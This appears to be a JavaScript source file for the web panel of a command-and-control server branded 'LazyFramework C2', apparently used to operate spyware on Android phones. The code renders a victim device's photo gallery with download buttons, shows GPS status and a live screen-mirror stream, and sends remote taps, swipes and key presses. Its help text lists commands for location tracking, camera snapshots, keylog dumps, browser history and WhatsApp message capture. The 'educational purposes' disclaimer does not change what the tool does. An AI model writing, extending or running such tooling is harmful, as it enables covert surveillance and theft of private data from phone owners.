        if (!rdpMode || !selectedAgent || !isDragging) return;
        const video = document.getElementById('live-mirror-video');
        if (!video) return;
        const rect = video.getBoundingClientRect();
        const dragEndX = ((e.clientX - rect.left) / rect.width) * 100;
        const dragEndY = ((e.clientY - rect.top) / rect.height) * 100;
        
        const dx = Math.abs(dragEndX - dragStartX);
        const dy = Math.abs(dragEndY - dragStartY);
        
        if (dx > 2 || dy > 2) {
            sendCommand('RDP_SWIPE', 
                `${Math.round(dragStartX)},${Math.round(dragStartY)},${Math.round(dragEndX)},${Math.round(dragEndY)}`);
        }
        isDragging = false;
    });
    
    // Right click = Back
    document.addEventListener('contextmenu', function(e) {
        if (!rdpMode || !selectedAgent) return;
        e.preventDefault();
        sendCommand('RDP_BACK');
        addOutputLine('🔙 Back (right-click)', 'info');
    });
    
    // Keyboard
    document.addEventListener('keydown', function(e) {
        if (!rdpMode || !selectedAgent) return;
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
        if (e.key === 'Escape') { document.getElementById('rdp-mouse-toggle')?.click(); return; }
        
        let keyCode = e.keyCode || e.which;
        sendCommand('RDP_KEY', String(keyCode));
    });
}

// Panggil di DOMContentLoaded
document.addEventListener('DOMContentLoaded', function() {
    setupRDPControls();
});


// ==================== GALLERY HANDLER ====================

function handleGalleryData(data) {
    console.log('🖼️ Gallery data received:', data);
    const container = document.getElementById('gallery-content');
    if (!container) return;

    const result = data.data || data.result || {};
    let images = result.data || [];
    let count = result.count || images.length || 0;

    container.innerHTML = '';

    const stats = document.createElement('div');
    stats.style.cssText = `
        display: flex;
        gap: 12px;
        padding: 6px 0 10px 0;
        border-bottom: 1px solid #1a2633;
        margin-bottom: 10px;
        color: #6b7a8a;
        font-size: 11px;
        flex-wrap: wrap;
    `;
    stats.innerHTML = `
        <span>🖼️ Agent: <strong>${data.agent_id ? data.agent_id.substring(0, 12) + '...' : 'Unknown'}</strong></span>
        <span>📊 Total Images: <strong style="color:#ff6b6b;">${count}</strong></span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
        <span><input class="tab-search" placeholder="🔍 Search..." oninput="filterGallery(this.value)"></span>
    `;
    container.appendChild(stats);

    if (result.status === 'permission_denied') {
        container.innerHTML += `
            <div style="background:#2a0a0a;border:1px solid #ff6b6b;border-radius:6px;padding:12px;color:#ff6b6b;text-align:center;font-size:13px;">
                ❌ Permission Denied: READ_EXTERNAL_STORAGE or READ_MEDIA_IMAGES
            </div>
        `;
        return;
    }

    if (!images || images.length === 0) {
        container.innerHTML += `<div class="info" style="padding:16px;text-align:center;color:#6b7a8a;font-size:13px;">📭 No images found</div>`;
        return;
    }

    const grid = document.createElement('div');
    grid.id = 'gallery-grid';
    grid.style.cssText = `
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
        gap: 12px;
        padding: 4px 0;
    `;

    images.forEach((image, index) => {
        const div = document.createElement('div');
        div.className = 'gallery-item';
        div.dataset.name = (image.name || '').toLowerCase();
        div.style.cssText = `
            background: #0d1520;
            border-radius: 8px;
            border: 1px solid #1a2633;
            overflow: hidden;
            transition: all 0.3s;
            cursor: pointer;
        `;
        div.onmouseover = function() { 
            this.style.borderColor = '#00d2ff'; 
            this.style.transform = 'scale(1.02)';
            this.style.boxShadow = '0 4px 20px rgba(0, 210, 255, 0.1)';
        };
        div.onmouseout = function() { 
            this.style.borderColor = '#1a2633'; 
            this.style.transform = 'scale(1)';
            this.style.boxShadow = 'none';
        };

        // ✅ TAMPILKAN PREVIEW GAMBAR
        let imageHtml = '';
        if (image.thumbnail || image.data || image.image_data) {
            // Jika ada data gambar (base64)
            const imgData = image.thumbnail || image.data || image.image_data;
            imageHtml = `
                <div style="height:160px;overflow:hidden;background:#0a0e17;display:flex;align-items:center;justify-content:center;">
                    <img src="data:image/jpeg;base64,${imgData}" 
                         style="width:100%;height:100%;object-fit:cover;"
                         onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\\'font-size:48px;color:#6b7a8a;\\'>🖼️</span>'">
                </div>
            `;
        } else if (image.path) {
            // Jika hanya ada path, coba tampilkan placeholder dengan ikon
            const ext = (image.name || '').split('.').pop().toLowerCase();
            const icon = getFileIcon(image.name || '');
            imageHtml = `
                <div style="height:160px;background:#0a0e17;display:flex;align-items:center;justify-content:center;font-size:64px;color:${getColorForExt(ext)};">
                    ${icon}
                </div>
            `;
        } else {
            // Fallback
            imageHtml = `
                <div style="height:160px;background:#0a0e17;display:flex;align-items:center;justify-content:center;font-size:64px;color:#6b7a8a;">
                    🖼️
                </div>
            `;
        }

        // Warna berdasarkan ekstensi
        const ext = (image.name || '').split('.').pop().toLowerCase();
        const color = getColorForExt(ext);

        div.innerHTML = `
            ${imageHtml}
            <div style="padding:8px 10px;">
                <div style="color:#c8d6e5;font-size:11px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" 
                     title="${escapeHtml(image.name || '')}">
                    ${escapeHtml(image.name || 'Unknown')}
                </div>
                <div style="display:flex;justify-content:space-between;margin-top:4px;font-size:9px;color:#6b7a8a;">
                    <span>${image.size || '0 B'}</span>
                    <span>${image.date || ''}</span>
                </div>
                <div style="margin-top:4px;display:flex;gap:4px;">
                    ${image.path ? `
                        <button onclick="event.stopPropagation();downloadGalleryImage('${image.path}')" 
                                style="background:#1a2633;border:none;color:#00d2ff;padding:2px 8px;border-radius:3px;font-size:10px;cursor:pointer;">
                            ⬇️ Download
                        </button>
                        <button onclick="event.stopPropagation();viewGalleryImage('${image.path}')" 
                                style="background:#1a2633;border:none;color:#ffd93d;padding:2px 8px;border-radius:3px;font-size:10px;cursor:pointer;">
                            👁️ View
                        </button>
                    ` : ''}
                </div>
            </div>
        `;

        // Click untuk melihat detail / path
        div.onclick = function(e) {
            if (e.target.tagName === 'BUTTON') return;
            if (image.path) {
                copyToClipboard(image.path);
                addOutputLine(`📋 Copied path: ${image.path}`, 'info');
            }
        };

        grid.appendChild(div);
    });

    container.appendChild(grid);
    switchToTab('gallery');
}

// Helper untuk warna berdasarkan ekstensi
function getColorForExt(ext) {
    const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg'];
    const videoExts = ['mp4', 'avi', 'mkv', 'mov', 'wmv', 'flv', 'webm'];
    const audioExts = ['mp3', 'wav', 'ogg', 'flac', 'aac', 'm4a'];
    
    if (imageExts.includes(ext)) return '#ff6b6b';
    if (videoExts.includes(ext)) return '#00d2ff';
    if (audioExts.includes(ext)) return '#51cf66';
    return '#ffd93d';
}

function viewGalleryImage(path) {
    if (!selectedAgent) {
        addOutputLine('⚠️ Select agent first', 'error');
        return;
    }
    if (!path) {
        addOutputLine('⚠️ No path specified', 'error');
        return;
    }
    addOutputLine(`👁️ Viewing image: ${path}`, 'info');
    
    // Download dan tampilkan preview
    sendCommand('DOWNLOAD_FILE', path);
}

function filterGallery(query) {
    const items = document.querySelectorAll('#gallery-grid .gallery-item');
    const q = query.toLowerCase();
    items.forEach(item => {
        const name = item.dataset.name || '';
        item.style.display = name.includes(q) ? 'block' : 'none';
    });
}

function refreshGallery() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Select agent first', 'error');
        return;
    }
    sendCommand('GET_GALLERY');
}

function exportGallery() {
    const items = document.querySelectorAll('#gallery-grid .gallery-item');
    if (items.length === 0) {
        addOutputLine('⚠️ No images to export', 'error');
        return;
    }
    let csv = 'Name,Path,Size,Date\n';
    items.forEach(item => {
        const name = item.querySelector('[style*="color:#c8d6e5"]')?.textContent || '';
        const size = item.querySelectorAll('[style*="color:#6b7a8a"]')[0]?.textContent || '';
        const date = item.querySelectorAll('[style*="color:#6b7a8a"]')[1]?.textContent || '';
        csv += `"${name}","${name}","${size}","${date}"\n`;
    });
    downloadFile(csv, `gallery_${Date.now()}.csv`, 'text/csv');
    addOutputLine(`📤 Exported ${items.length} images`, 'success');
}

function downloadGalleryImage(path) {
    if (!selectedAgent) {
        addOutputLine('⚠️ Select agent first', 'error');
        return;
    }
    if (!path) {
        addOutputLine('⚠️ No path specified for image', 'error');
        return;
    }
    addOutputLine(`⬇️ Downloading image: ${path}`, 'info');
    sendCommand('DOWNLOAD_FILE', path);
}

// ==================== GPS STATUS HANDLER ====================

function handleGPSStatus(data) {
    console.log('🛰️ GPS Status received:', data);
    
    const container = document.getElementById('location-content');
    if (!container) return;
    
    const status = data.data || {};
    
    // Cari atau buat card GPS status
    let gpsCard = container.querySelector('.gps-status-card');
    if (!gpsCard) {
        gpsCard = document.createElement('div');
        gpsCard.className = 'gps-status-card';
        gpsCard.style.cssText = `
            background: #0d1520;
            border-radius: 8px;
            padding: 12px 16px;
            border: 1px solid #1a2633;
            margin-bottom: 10px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 8px;
        `;
        container.prepend(gpsCard);
    }
    
    const gpsEnabled = status.gps_enabled || false;
    const networkEnabled = status.network_enabled || false;
    const accuracy = status.accuracy || 'N/A';
    const provider = status.provider || 'N/A';
    const quality = status.quality || 'Unknown';
    const satellites = status.satellites || 'N/A';
    
    // Warna quality
    let qualityColor = '#6b7a8a';
    if (quality.includes('Excellent')) qualityColor = '#51cf66';
    else if (quality.includes('Good')) qualityColor = '#ffd93d';
    else if (quality.includes('Fair')) qualityColor = '#ff922b';
    else if (quality.includes('Poor')) qualityColor = '#ff6b6b';
    
    gpsCard.innerHTML = `
        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
            <div style="color:#6b7a8a;font-size:9px;">📡 GPS</div>
            <div style="color:${gpsEnabled ? '#51cf66' : '#ff6b6b'};font-weight:bold;font-size:13px;">
                ${gpsEnabled ? '✅ Active' : '❌ Disabled'}
            </div>
        </div>
        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
            <div style="color:#6b7a8a;font-size:9px;">📶 Network</div>
            <div style="color:${networkEnabled ? '#51cf66' : '#ff6b6b'};font-weight:bold;font-size:13px;">
                ${networkEnabled ? '✅ Active' : '❌ Disabled'}
            </div>
        </div>
        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
            <div style="color:#6b7a8a;font-size:9px;">🎯 Accuracy</div>
            <div style="color:#00d2ff;font-weight:bold;font-size:13px;">
                ${accuracy}m
            </div>
        </div>
        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
            <div style="color:#6b7a8a;font-size:9px;">📶 Provider</div>
            <div style="color:#c8d6e5;font-weight:bold;font-size:12px;">
                ${provider}
            </div>
        </div>
        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
            <div style="color:#6b7a8a;font-size:9px;">🛰️ Satellites</div>
            <div style="color:#ffd93d;font-weight:bold;font-size:13px;">
                ${satellites}
            </div>
        </div>
        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
            <div style="color:#6b7a8a;font-size:9px;">⭐ Quality</div>
            <div style="color:${qualityColor};font-weight:bold;font-size:13px;">
                ${quality}
            </div>
        </div>
    `;
}

function handleVideoFrame(agentId, frame) {
    if (selectedAgent !== agentId && selectedAgent) return;
    
    const container = DOM.livemirrorContent;
    if (!container) return;
    
    let video = container.querySelector('#live-mirror-video');
    if (!video) {
        video = document.createElement('img');
        video.id = 'live-mirror-video';
        video.style.cssText = `
            width: 100%;
            max-width: 800px;
            max-height: 600px;
            border-radius: 8px;
            border: 2px solid #00d2ff;
            box-shadow: 0 0 40px rgba(0, 210, 255, 0.2);
            background: #0a0e17;
            display: block;
            margin: 0 auto;
            object-fit: contain;
        `;
        container.appendChild(video);
        
        const info = document.createElement('div');
        info.id = 'live-stream-info';
        info.style.cssText = `
            text-align: center;
            color: #51cf66;
            font-size: 12px;
            padding: 6px 0;
            font-family: 'Courier New', monospace;
        `;
        info.textContent = '🎬 Realtime Stream - Active';
        container.appendChild(info);
    }
    
    if (frame && frame.data) {
        video.src = `data:image/jpeg;base64,${frame.data}`;
        
        const info = container.querySelector('#live-stream-info');
        if (info) {
            const frameNum = frame.frame_number || 0;
            const size = frame.size || frame.data.length;
            info.textContent = `🎬 Realtime Stream - Frame #${frameNum} | ${formatSize(size)} | Active`;
            info.style.color = '#51cf66';
        }
    }
}

// ==================== ABOUT & HELP ====================

function showAbout() {
    addOutputLine('🛡️ LazyFramework C2 Server v2.0', 'info');
    addOutputLine('📡 Made with ❤️ for educational purposes', 'info');
    addOutputLine('🔒 Use responsibly and ethically', 'info');
}

function showHelp() {
    addOutputLine('📋 Available Commands:', 'info');
    addOutputLine('  📱 GET_DEVICE_INFO - Device information', 'info');
    addOutputLine('  📍 GET_LOCATION - GPS location', 'info');
    addOutputLine('  📍 LOCATION_TRACK_START <interval> - Start tracking', 'info');
    addOutputLine('  📍 LOCATION_TRACK_STOP - Stop tracking', 'info');
    addOutputLine('  📍 LOCATION_HISTORY <limit> - Get location history', 'info');
    addOutputLine('  📷 CAMERA_SNAPSHOT [back|front] - Take photo', 'info');
    addOutputLine('  📸 SCREENSHOT - Capture screen', 'info');
    addOutputLine('  ⌨️ KEYLOG_DUMP - Get keylogs', 'info');
    addOutputLine('  🌐 BROWSER_INFO - Get browser info', 'info');
    addOutputLine('  🌐 BROWSER_HISTORY - Get browser history', 'info');
    addOutputLine('  🌐 BROWSER_ALL - Get all browser data', 'info');
    addOutputLine('  💬 WA_CAPTURE_DUMP - Get WhatsApp messages', 'info');
    addOutputLine('  📁 GET_FILES_LIST <path> - List files', 'info');
    addOutputLine('  ⬇️ DOWNLOAD_FILE <path> - Download file', 'info');
    addOutputLine('  ❓ HELP - Show this help', 'info');
}

function toggleTheme() {
    document.body.style.background = document.body.style.background === '#0a0e17' ? '#1a1a2e' : '#0a0e17';
    addOutputLine('🎨 Theme toggled', 'info');
}

